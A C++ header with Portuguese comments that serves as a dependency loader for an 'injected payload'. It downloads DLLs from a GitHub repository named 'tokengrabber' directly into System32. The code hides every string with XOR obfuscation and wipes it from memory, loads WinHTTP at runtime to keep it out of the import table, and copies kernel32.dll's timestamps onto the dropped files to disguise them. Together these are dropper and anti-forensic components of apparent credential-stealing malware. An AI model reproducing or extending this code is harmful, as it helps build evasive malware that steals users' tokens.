#pragma once
//
// Dependencies.hpp
// -----------------------------------------------------------------------------
// Preflight de dependencias de runtime usadas pelo payload injetado.
//
// Regra:
//   - Se TODOS os DLLs ja existem em System32  -> retorna true e NAO faz nada
//     (nenhum acesso a rede, nenhuma escrita em disco, nenhum arquivo de log).
//   - Se algum faltar -> baixa o DLL exato da URL configurada DIRETO no
//     destino (System32), valida o binario (PE x64 + SHA-256 pinado) e mantem
//     o arquivo. Nao ha staging em %TEMP%, copia, movimentacao nem cache.
//   - Se a URL falhar ou o hash nao bater -> o DLL nao e instalado. Nao ha
//     instalador .exe (VC++/DirectX redistributable) como fallback.
//
// Por que hash pinado:
//   A URL sozinha nao autentica o conteudo. O SHA-256 abaixo foi extraido dos
//   binarios baixados e conferido com Get-AuthenticodeSignature: todos sao
//   validamente assinados por "CN=Microsoft Corporation". Se o servidor
//   devolver qualquer outro byte, o arquivo e descartado.
//
// Strings:
//   Nenhum nome de DLL, URL ou mensagem de log fica em texto claro no binario:
//   tudo passa por xorstr (ver xorstr.hpp). Depois do uso, cada copia
//   descriptografada e zerada (scrub) para nao continuar legivel na memoria do
//   processo atual. As tabelas sao recriadas a cada chamada e o destrutor das
//   listas faz o wipe automaticamente.
//
// O header e auto-contido de proposito: pode ser incluido pelo loader e por um
// harness de teste sem arrastar Functions.hpp.
//
// Nao adiciona winhttp.lib ao IAT: WinHTTP e resolvido em runtime via
// LoadLibraryW/GetProcAddress.
// -----------------------------------------------------------------------------

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif
#include <windows.h>

#include <cstddef>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>

#include "xorstr.hpp"

#if defined(_MSC_VER)
// OpenProcessToken/GetTokenInformation (elevation check). ADVAPI32 is already
// linked by the loader; the pragma keeps this header self-contained for tests.
#pragma comment(lib, "advapi32.lib")
#endif

namespace deps
{
    // -------------------------------------------------------------------------
    // Strings descriptografadas
    // -------------------------------------------------------------------------
    // xorstr() devolve um ponteiro para o buffer interno de um objeto
    // temporario. W()/A() copiam na hora; logo depois o destrutor do xorstr
    // zera o temporario (ver xorstr.hpp) e o SecureWipe zera a copia.
    namespace detail
    {
        inline void SecureWipe(std::wstring& text) noexcept
        {
            if (!text.empty())
            {
                volatile wchar_t* data = &text[0];
                for (std::size_t i = 0; i < text.size(); ++i)
                    data[i] = 0;
            }
            text.clear();
        }

        inline void SecureWipe(std::string& text) noexcept
        {
            if (!text.empty())
            {
                volatile char* data = &text[0];
                for (std::size_t i = 0; i < text.size(); ++i)
                    data[i] = 0;
            }
            text.clear();
        }

        // Garante o wipe mesmo em retorno antecipado.
        struct ScopedWipe
        {
            std::wstring& text;
            explicit ScopedWipe(std::wstring& target) : text(target) {}
            ~ScopedWipe() { SecureWipe(text); }
            ScopedWipe(const ScopedWipe&) = delete;
            ScopedWipe& operator=(const ScopedWipe&) = delete;
        };

        inline std::wstring W(const wchar_t* text) { return std::wstring(text); }
        inline std::string  A(const char* text)    { return std::string(text); }
    } // namespace detail
    // -------------------------------------------------------------------------
    // Tabela de dependencias
    // -------------------------------------------------------------------------
    struct Dependency
    {
        std::wstring name;
    };

    // Wipe no destrutor: os nomes nao continuam em texto claro na memoria
    // depois que a tabela sai de escopo.
    struct DependencyList
    {
        std::vector<Dependency> items;

        DependencyList() = default;
        DependencyList(const DependencyList&) = delete;
        DependencyList& operator=(const DependencyList&) = delete;
        DependencyList(DependencyList&&) = default;
        DependencyList& operator=(DependencyList&&) = default;

        ~DependencyList()
        {
            for (auto& entry : items)
                detail::SecureWipe(entry.name);
            items.clear();
        }
    };

    inline DependencyList DependencyTable()
    {
        DependencyList list;
        list.items.push_back({ detail::W(xorstr(L"msvcp140.dll")) });
        list.items.push_back({ detail::W(xorstr(L"vcruntime140.dll")) });
        list.items.push_back({ detail::W(xorstr(L"vcruntime140_1.dll")) });
        list.items.push_back({ detail::W(xorstr(L"d3dcompiler_43.dll")) });
        list.items.push_back({ detail::W(xorstr(L"d3dx9_43.dll")) });
        list.items.push_back({ detail::W(xorstr(L"d3dx11_43.dll")) });
        return list;
    }

    // -------------------------------------------------------------------------
    // Fontes diretas (GitHub raw) + SHA-256 pinado.
    // Links estaveis: nao expiram como os anexos assinados do Discord.
    // -------------------------------------------------------------------------
    struct DirectSource
    {
        std::wstring name;
        std::wstring url;
        std::string  sha256;   // lowercase hex, 64 chars
    };

    struct DirectSourceList
    {
        std::vector<DirectSource> items;

        DirectSourceList() = default;
        DirectSourceList(const DirectSourceList&) = delete;
        DirectSourceList& operator=(const DirectSourceList&) = delete;
        DirectSourceList(DirectSourceList&&) = default;
        DirectSourceList& operator=(DirectSourceList&&) = default;

        ~DirectSourceList()
        {
            for (auto& entry : items)
            {
                detail::SecureWipe(entry.name);
                detail::SecureWipe(entry.url);
                detail::SecureWipe(entry.sha256);
            }
            items.clear();
        }
    };

    inline DirectSourceList DirectSourceTable()
    {
        DirectSourceList list;
        list.items.push_back({
            detail::W(xorstr(L"msvcp140.dll")),
            detail::W(xorstr(L"https://raw.githubusercontent.com/bielzxdev/tokengrabber/main/msvcp140.dll")),
            detail::A(xorstr("88f55d86b50b0a7e55e71ad2d8f7552146ba26e927230daf2e26ad3a971973c5"))
        });
        list.items.push_back({
            detail::W(xorstr(L"vcruntime140.dll")),
            detail::W(xorstr(L"https://raw.githubusercontent.com/bielzxdev/tokengrabber/main/vcruntime140.dll")),
            detail::A(xorstr("7d7ca28235fba5603a7f40514a552ac7efaa67a5d5792bb06273916aa8565c5f"))
        });
        list.items.push_back({
            detail::W(xorstr(L"vcruntime140_1.dll")),
            detail::W(xorstr(L"https://raw.githubusercontent.com/bielzxdev/tokengrabber/main/vcruntime140_1.dll")),
            detail::A(xorstr("b92a29f2f0f61514ac3861cc20152dce856c8e56fa66a3913a319761df29ddbf"))
        });
        list.items.push_back({
            detail::W(xorstr(L"d3dcompiler_43.dll")),
            detail::W(xorstr(L"https://raw.githubusercontent.com/bielzxdev/tokengrabber/main/D3DCompiler_43.dll")),
            detail::A(xorstr("44c3a7e330b54a35a9efa015831392593aa02e7da1460be429d17c3644850e8a"))
        });
        list.items.push_back({
            detail::W(xorstr(L"d3dx9_43.dll")),
            detail::W(xorstr(L"https://raw.githubusercontent.com/bielzxdev/tokengrabber/main/D3DX9_43.dll")),
            detail::A(xorstr("84b900dbd7fa978d6e0caee26fc54f2f61d92c9c75d10b35f00e3e82cd1d67b4"))
        });
        list.items.push_back({
            detail::W(xorstr(L"d3dx11_43.dll")),
            detail::W(xorstr(L"https://raw.githubusercontent.com/bielzxdev/tokengrabber/main/D3DX11_43.DLL")),
            detail::A(xorstr("981e42629df751217406e7150477cddc853b79abd6a8568a1566298ed8f7bd59"))
        });
        return list;
    }

    // Sem instaladores .exe: apenas os DLLs das fontes diretas acima.

    // -------------------------------------------------------------------------
    // SHA-256 (self-contained, sem bcrypt/OpenSSL no IAT)
    // -------------------------------------------------------------------------
    namespace sha256
    {
        inline uint32_t RotR(uint32_t x, uint32_t n)
        {
            return (x >> n) | (x << (32 - n));
        }

        inline const uint32_t* Constants()
        {
            static const uint32_t k[64] = {
                0x428a2f98u,0x71374491u,0xb5c0fbcfu,0xe9b5dba5u,
                0x3956c25bu,0x59f111f1u,0x923f82a4u,0xab1c5ed5u,
                0xd807aa98u,0x12835b01u,0x243185beu,0x550c7dc3u,
                0x72be5d74u,0x80deb1feu,0x9bdc06a7u,0xc19bf174u,
                0xe49b69c1u,0xefbe4786u,0x0fc19dc6u,0x240ca1ccu,
                0x2de92c6fu,0x4a7484aau,0x5cb0a9dcu,0x76f988dau,
                0x983e5152u,0xa831c66du,0xb00327c8u,0xbf597fc7u,
                0xc6e00bf3u,0xd5a79147u,0x06ca6351u,0x14292967u,
                0x27b70a85u,0x2e1b2138u,0x4d2c6dfcu,0x53380d13u,
                0x650a7354u,0x766a0abbu,0x81c2c92eu,0x92722c85u,
                0xa2bfe8a1u,0xa81a664bu,0xc24b8b70u,0xc76c51a3u,
                0xd192e819u,0xd6990624u,0xf40e3585u,0x106aa070u,
                0x19a4c116u,0x1e376c08u,0x2748774cu,0x34b0bcb5u,
                0x391c0cb3u,0x4ed8aa4au,0x5b9cca4fu,0x682e6ff3u,
                0x748f82eeu,0x78a5636fu,0x84c87814u,0x8cc70208u,
                0x90befffau,0xa4506cebu,0xbef9a3f7u,0xc67178f2u
            };
            return k;
        }

        struct Context
        {
            uint32_t state[8];
            uint64_t length;
            unsigned char buffer[64];
            std::size_t used;
        };

        inline void Init(Context& ctx)
        {
            static const uint32_t iv[8] = {
                0x6a09e667u,0xbb67ae85u,0x3c6ef372u,0xa54ff53au,
                0x510e527fu,0x9b05688cu,0x1f83d9abu,0x5be0cd19u
            };
            for (int i = 0; i < 8; ++i) ctx.state[i] = iv[i];
            ctx.length = 0;
            ctx.used = 0;
        }

        inline void Transform(Context& ctx, const unsigned char* block)
        {
            const uint32_t* k = Constants();
            uint32_t w[64];
            for (int i = 0; i < 16; ++i)
            {
                w[i] = (static_cast<uint32_t>(block[i * 4]) << 24) |
                       (static_cast<uint32_t>(block[i * 4 + 1]) << 16) |
                       (static_cast<uint32_t>(block[i * 4 + 2]) << 8) |
                       (static_cast<uint32_t>(block[i * 4 + 3]));
            }
            for (int i = 16; i < 64; ++i)
            {
                const uint32_t s0 = RotR(w[i - 15], 7) ^ RotR(w[i - 15], 18) ^ (w[i - 15] >> 3);
                const uint32_t s1 = RotR(w[i - 2], 17) ^ RotR(w[i - 2], 19) ^ (w[i - 2] >> 10);
                w[i] = w[i - 16] + s0 + w[i - 7] + s1;
            }

            uint32_t a = ctx.state[0], b = ctx.state[1], c = ctx.state[2], d = ctx.state[3];
            uint32_t e = ctx.state[4], f = ctx.state[5], g = ctx.state[6], h = ctx.state[7];

            for (int i = 0; i < 64; ++i)
            {
                const uint32_t S1 = RotR(e, 6) ^ RotR(e, 11) ^ RotR(e, 25);
                const uint32_t ch = (e & f) ^ (~e & g);
                const uint32_t t1 = h + S1 + ch + k[i] + w[i];
                const uint32_t S0 = RotR(a, 2) ^ RotR(a, 13) ^ RotR(a, 22);
                const uint32_t maj = (a & b) ^ (a & c) ^ (b & c);
                const uint32_t t2 = S0 + maj;

                h = g; g = f; f = e; e = d + t1;
                d = c; c = b; b = a; a = t1 + t2;
            }

            ctx.state[0] += a; ctx.state[1] += b; ctx.state[2] += c; ctx.state[3] += d;
            ctx.state[4] += e; ctx.state[5] += f; ctx.state[6] += g; ctx.state[7] += h;
        }

        inline void Update(Context& ctx, const unsigned char* data, std::size_t size)
        {
            ctx.length += size;
            while (size > 0)
            {
                const std::size_t space = 64 - ctx.used;
                const std::size_t take = size < space ? size : space;
                std::memcpy(ctx.buffer + ctx.used, data, take);
                ctx.used += take;
                data += take;
                size -= take;
                if (ctx.used == 64)
                {
                    Transform(ctx, ctx.buffer);
                    ctx.used = 0;
                }
            }
        }

        inline void Final(Context& ctx, unsigned char out[32])
        {
            const uint64_t bitLength = ctx.length * 8;

            ctx.buffer[ctx.used++] = 0x80;
            if (ctx.used > 56)
            {
                while (ctx.used < 64) ctx.buffer[ctx.used++] = 0;
                Transform(ctx, ctx.buffer);
                ctx.used = 0;
            }
            while (ctx.used < 56) ctx.buffer[ctx.used++] = 0;

            for (int i = 0; i < 8; ++i)
                ctx.buffer[56 + i] = static_cast<unsigned char>(bitLength >> (56 - i * 8));
            Transform(ctx, ctx.buffer);

            for (int i = 0; i < 8; ++i)
            {
                out[i * 4]     = static_cast<unsigned char>(ctx.state[i] >> 24);
                out[i * 4 + 1] = static_cast<unsigned char>(ctx.state[i] >> 16);
                out[i * 4 + 2] = static_cast<unsigned char>(ctx.state[i] >> 8);
                out[i * 4 + 3] = static_cast<unsigned char>(ctx.state[i]);
            }
        }

        inline bool HashFile(const std::wstring& path, unsigned char out[32])
        {
            HANDLE file = CreateFileW(path.c_str(), GENERIC_READ,
                                      FILE_SHARE_READ, nullptr, OPEN_EXISTING,
                                      FILE_ATTRIBUTE_NORMAL, nullptr);
            if (file == INVALID_HANDLE_VALUE) return false;

            Context ctx;
            Init(ctx);

            unsigned char buffer[65536];
            DWORD read = 0;
            bool ok = true;
            while (ok && ReadFile(file, buffer, sizeof(buffer), &read, nullptr) && read > 0)
                Update(ctx, buffer, read);
            if (read != 0 && GetLastError() != ERROR_SUCCESS)
                ok = false;

            CloseHandle(file);
            if (!ok) return false;
            Final(ctx, out);
            return true;
        }

        inline std::string ToHex(const unsigned char* digest)
        {
            const std::string kHex = detail::A(xorstr("0123456789abcdef"));
            std::string out(64, '\0');
            for (int i = 0; i < 32; ++i)
            {
                out[static_cast<std::size_t>(i) * 2] = kHex[digest[i] >> 4];
                out[static_cast<std::size_t>(i) * 2 + 1] = kHex[digest[i] & 0x0F];
            }
            return out;
        }
    } // namespace sha256

    // -------------------------------------------------------------------------
    // Path / file helpers
    // -------------------------------------------------------------------------
    inline std::wstring JoinPath(const std::wstring& dir, const wchar_t* name)
    {
        std::wstring out = dir;
        if (!out.empty() && out.back() != L'\\' && out.back() != L'/')
            out.push_back(L'\\');
        out += name;
        return out;
    }

    inline std::wstring System32Dir()
    {
        return detail::W(xorstr(L"C:\\Windows\\System32"));
    }

    inline std::wstring TempDir()
    {
        return detail::W(xorstr(L"C:\\Windows\\Temp"));
    }

    inline bool FileExists(const std::wstring& path)
    {
        const DWORD attrs = GetFileAttributesW(path.c_str());
        return attrs != INVALID_FILE_ATTRIBUTES &&
               (attrs & FILE_ATTRIBUTE_DIRECTORY) == 0;
    }

    // -------------------------------------------------------------------------
    // Timestamp uniforme
    // -------------------------------------------------------------------------
    // Copia creation/access/write times de um arquivo nativo do System32
    // (kernel32.dll) para o DLL recem-instalado. Assim todos os arquivos
    // instalados ficam com exatamente a mesma data/hora do sistema, em vez do
    // horario do download. Falhas sao silenciosas: o instalador nao deve
    // falhar por causa de metadados.
    inline void ApplySystemReferenceTimestamps(const std::wstring& target)
    {
        const std::wstring reference =
            JoinPath(System32Dir(), xorstr(L"kernel32.dll"));

        HANDLE hRef = CreateFileW(reference.c_str(), GENERIC_READ,
                                  FILE_SHARE_READ | FILE_SHARE_WRITE |
                                      FILE_SHARE_DELETE,
                                  nullptr, OPEN_EXISTING,
                                  FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hRef == INVALID_HANDLE_VALUE)
            return;

        FILETIME creation{}, access{}, write{};
        const BOOL got = GetFileTime(hRef, &creation, &access, &write);
        CloseHandle(hRef);
        if (!got)
            return;

        HANDLE hTarget = CreateFileW(target.c_str(), FILE_WRITE_ATTRIBUTES,
                                     FILE_SHARE_READ | FILE_SHARE_WRITE |
                                         FILE_SHARE_DELETE,
                                     nullptr, OPEN_EXISTING,
                                     FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hTarget == INVALID_HANDLE_VALUE)
            return;

        SetFileTime(hTarget, &creation, &access, &write);
        CloseHandle(hTarget);
    }

    // true se algum DLL da tabela faltar em `dir`.
    inline bool MissingInDirectory(const std::wstring& dir, std::wstring& missing)
    {
        DependencyList table = DependencyTable();
        bool any = false;
        for (std::size_t i = 0; i < table.items.size(); ++i)
        {
            const std::wstring& name = table.items[i].name;
            if (!FileExists(JoinPath(dir, name.c_str())))
            {
                if (any) missing += detail::W(xorstr(L", "));
                missing += name;
                any = true;
            }
        }
        return any;
    }

    inline std::wstring DescribeSystemDependencies()
    {
        const std::wstring sys = System32Dir();
        DependencyList table = DependencyTable();
        const std::wstring present = detail::W(xorstr(L"\tPRESENT\t"));
        const std::wstring absent  = detail::W(xorstr(L"\tMISSING\t"));
        const std::wstring newline = detail::W(xorstr(L"\r\n"));
        std::wstring out;
        for (std::size_t i = 0; i < table.items.size(); ++i)
        {
            const std::wstring& name = table.items[i].name;
            const std::wstring path = JoinPath(sys, name.c_str());
            out += name;
            out += FileExists(path) ? present : absent;
            out += path;
            if (i + 1 < table.items.size()) out += newline;
        }
        return out;
    }

    // -------------------------------------------------------------------------
    // Elevation
    // -------------------------------------------------------------------------
    inline bool IsElevated()
    {
        HANDLE token = nullptr;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
            return false;

        TOKEN_ELEVATION elevation{};
        DWORD returned = 0;
        const BOOL ok = GetTokenInformation(token, TokenElevation, &elevation,
                                           sizeof(elevation), &returned);
        CloseHandle(token);
        return ok && elevation.TokenIsElevated != 0;
    }

    // -------------------------------------------------------------------------
    // Minimal WinHTTP downloader (resolved at runtime, no winhttp.lib in IAT)
    // -------------------------------------------------------------------------
    namespace winhttp
    {
        using fnOpen          = void* (WINAPI*)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
        using fnConnect       = void* (WINAPI*)(void*, LPCWSTR, WORD, DWORD);
        using fnOpenRequest   = void* (WINAPI*)(void*, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
        using fnSendRequest   = BOOL  (WINAPI*)(void*, LPCWSTR, DWORD, void*, DWORD, DWORD, DWORD_PTR);
        using fnReceive       = BOOL  (WINAPI*)(void*, void*);
        using fnReadData      = BOOL  (WINAPI*)(void*, void*, DWORD, DWORD*);
        using fnCloseHandle   = BOOL  (WINAPI*)(void*);

        struct Api
        {
            HMODULE module = nullptr;
            fnOpen open = nullptr;
            fnConnect connect = nullptr;
            fnOpenRequest openRequest = nullptr;
            fnSendRequest sendRequest = nullptr;
            fnReceive receive = nullptr;
            fnReadData readData = nullptr;
            fnCloseHandle closeHandle = nullptr;

            bool Load()
            {
                if (module) return true;
                module = LoadLibraryW(xorstr(L"winhttp.dll"));
                if (!module) return false;
                open         = reinterpret_cast<fnOpen>(GetProcAddress(module, xorstr("WinHttpOpen")));
                connect      = reinterpret_cast<fnConnect>(GetProcAddress(module, xorstr("WinHttpConnect")));
                openRequest  = reinterpret_cast<fnOpenRequest>(GetProcAddress(module, xorstr("WinHttpOpenRequest")));
                sendRequest  = reinterpret_cast<fnSendRequest>(GetProcAddress(module, xorstr("WinHttpSendRequest")));
                receive      = reinterpret_cast<fnReceive>(GetProcAddress(module, xorstr("WinHttpReceiveResponse")));
                readData     = reinterpret_cast<fnReadData>(GetProcAddress(module, xorstr("WinHttpReadData")));
                closeHandle  = reinterpret_cast<fnCloseHandle>(GetProcAddress(module, xorstr("WinHttpCloseHandle")));
                return open && connect && openRequest && sendRequest &&
                       receive && readData && closeHandle;
            }
        };

        inline Api& Instance()
        {
            static Api api;
            return api;
        }

        constexpr DWORD kFlagSecure = 0x00800000u; // WINHTTP_FLAG_SECURE
    } // namespace winhttp

    inline bool FileLooksLikePe(const std::wstring& path)
    {
        HANDLE h = CreateFileW(path.c_str(), GENERIC_READ,
                               FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h == INVALID_HANDLE_VALUE) return false;
        unsigned char magic[2]{};
        DWORD read = 0;
        const BOOL ok = ReadFile(h, magic, sizeof(magic), &read, nullptr);
        CloseHandle(h);
        return ok && read == 2 && magic[0] == 'M' && magic[1] == 'Z';
    }

    inline bool PeMachineIs(const std::wstring& path, WORD expected)
    {
        HANDLE h = CreateFileW(path.c_str(), GENERIC_READ,
                               FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h == INVALID_HANDLE_VALUE) return false;

        bool ok = false;
        IMAGE_DOS_HEADER dos{};
        DWORD read = 0;
        if (ReadFile(h, &dos, sizeof(dos), &read, nullptr) &&
            read == sizeof(dos) && dos.e_magic == IMAGE_DOS_SIGNATURE)
        {
            LARGE_INTEGER offset{};
            offset.QuadPart = dos.e_lfanew;
            if (SetFilePointerEx(h, offset, nullptr, FILE_BEGIN))
            {
                DWORD signature = 0;
                IMAGE_FILE_HEADER fileHeader{};
                if (ReadFile(h, &signature, sizeof(signature), &read, nullptr) &&
                    read == sizeof(signature) && signature == IMAGE_NT_SIGNATURE &&
                    ReadFile(h, &fileHeader, sizeof(fileHeader), &read, nullptr) &&
                    read == sizeof(fileHeader))
                {
                    ok = fileHeader.Machine == expected;
                }
            }
        }
        CloseHandle(h);
        return ok;
    }

    inline bool DownloadToFile(const std::wstring& url,
        const std::wstring& dest,
        std::wstring& error)
    {
        error.clear();

        winhttp::Api& api = winhttp::Instance();
        if (!api.Load())
            return false;

        std::wstring scheme = detail::W(xorstr(L"https://"));
        detail::ScopedWipe schemeGuard(scheme);

        if (url.size() <= scheme.size() ||
            url.compare(0, scheme.size(), scheme) != 0)
            return false;

        std::wstring rest = url.substr(scheme.size());
        detail::ScopedWipe restGuard(rest);

        const std::size_t slash = rest.find(L'/');
        if (slash == std::wstring::npos || slash == 0)
            return false;

        std::wstring host = rest.substr(0, slash);
        detail::ScopedWipe hostGuard(host);

        std::wstring path = rest.substr(slash);
        detail::ScopedWipe pathGuard(path);

        void* session = api.open(xorstr(L"sdeps"), 0,
            nullptr, nullptr, 0);
        if (!session)
            return false;

        void* connection = api.connect(session, host.c_str(), 443, 0);
        if (!connection)
        {
            api.closeHandle(session);
            return false;
        }

        void* request = api.openRequest(
            connection, xorstr(L"GET"), path.c_str(),
            nullptr, nullptr, nullptr, winhttp::kFlagSecure);

        if (!request)
        {
            api.closeHandle(connection);
            api.closeHandle(session);
            return false;
        }

        bool ok = api.sendRequest(request, nullptr, 0, nullptr, 0, 0, 0) != FALSE &&
            api.receive(request, nullptr) != FALSE;

        if (ok)
        {
            HANDLE file = CreateFileW(
                dest.c_str(), GENERIC_WRITE, 0, nullptr,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);

            if (file == INVALID_HANDLE_VALUE)
            {
                ok = false;
            }
            else
            {
                unsigned char buffer[16384];
                DWORD got = 0;

                while (api.readData(request, buffer, sizeof(buffer), &got) && got > 0)
                {
                    DWORD written = 0;

                    if (!WriteFile(file, buffer, got, &written, nullptr) ||
                        written != got)
                    {
                        ok = false;
                        break;
                    }
                }

                CloseHandle(file);
            }
        }

        api.closeHandle(request);
        api.closeHandle(connection);
        api.closeHandle(session);

        if (ok && !FileLooksLikePe(dest))
            ok = false;

        if (!ok)
            DeleteFileW(dest.c_str());

        return ok;
    }

    // -------------------------------------------------------------------------
    // Direct source install (GitHub raw + pinned SHA-256)
    // -------------------------------------------------------------------------
    // O download vai DIRETO para `targetDir` (System32). Nao existe arquivo
    // temporario, copia nem movimentacao: o proprio CreateFileW do WinHTTP
    // grava no destino final. Qualquer falha de validacao apaga o arquivo.
    inline bool InstallFromDirectSource(const DirectSource& source,
        const std::wstring& targetDir,
        std::wstring& error)
    {
        std::wstring target = JoinPath(targetDir, source.name.c_str());
        detail::ScopedWipe targetGuard(target);

        if (FileExists(target))
            return true;

        if (!DownloadToFile(source.url, target, error))
        {
            DeleteFileW(target.c_str());
            return false;
        }

        const WORD machine =
#if defined(_WIN64)
            IMAGE_FILE_MACHINE_AMD64;
#else
            IMAGE_FILE_MACHINE_I386;
#endif

        if (!PeMachineIs(target, machine))
        {
            DeleteFileW(target.c_str());
            return false;
        }

        unsigned char digest[32]{};

        if (!sha256::HashFile(target, digest))
        {
            DeleteFileW(target.c_str());
            return false;
        }

        std::string actual = sha256::ToHex(digest);
        const bool hashMatches = (actual == source.sha256);

        detail::SecureWipe(actual);

        if (!hashMatches)
        {
            DeleteFileW(target.c_str());
            return false;
        }

        // Uniformiza a data/hora com um arquivo nativo do sistema.
        ApplySystemReferenceTimestamps(target);

        return true;
    }

    // Instala somente via fontes diretas em `targetDir`. Usado pelo harness
    // para exercitar download direto + verificacao sem tocar em System32.
    inline bool EnsureDirectSourcesIn(const std::wstring& targetDir,
        std::wstring* report = nullptr)
    {
        DirectSourceList sources = DirectSourceTable();

        for (std::size_t i = 0; i < sources.items.size(); ++i)
        {
            if (FileExists(JoinPath(targetDir, sources.items[i].name.c_str())))
                continue;

            std::wstring error;
            detail::ScopedWipe errorGuard(error);

            InstallFromDirectSource(sources.items[i], targetDir, error);
        }

        if (report)
            report->clear();

        std::wstring missing;
        detail::ScopedWipe missingGuard(missing);

        return !MissingInDirectory(targetDir, missing);
    }

    // -------------------------------------------------------------------------
    // Public entry point
    // -------------------------------------------------------------------------
    // Retorna true se, ao final, todos os DLLs existem em System32.
    // `allowInstall == false` faz apenas o check (usado pelos testes).
    inline bool EnsureRuntimeDependencies(bool allowInstall = true,
        std::wstring* report = nullptr)
    {
        std::wstring sys = System32Dir();
        detail::ScopedWipe sysGuard(sys);
        std::wstring missing;
        detail::ScopedWipe missingGuard(missing);

        if (!MissingInDirectory(sys, missing))
        {
            if (report)
                report->clear();
            return true;
        }

        if (!allowInstall)
        {
            if (report)
                report->clear();
            return false;
        }

        DirectSourceList sources = DirectSourceTable();

        for (std::size_t i = 0; i < sources.items.size(); ++i)
        {
            if (!FileExists(JoinPath(sys, sources.items[i].name.c_str())))
            {
                std::wstring error;
                detail::ScopedWipe errorGuard(error);

                InstallFromDirectSource(sources.items[i], sys, error);
            }
        }

        missing.clear();
        const bool ok = !MissingInDirectory(sys, missing);

        if (report)
            report->clear();

        return ok;
    }
} // namespace deps
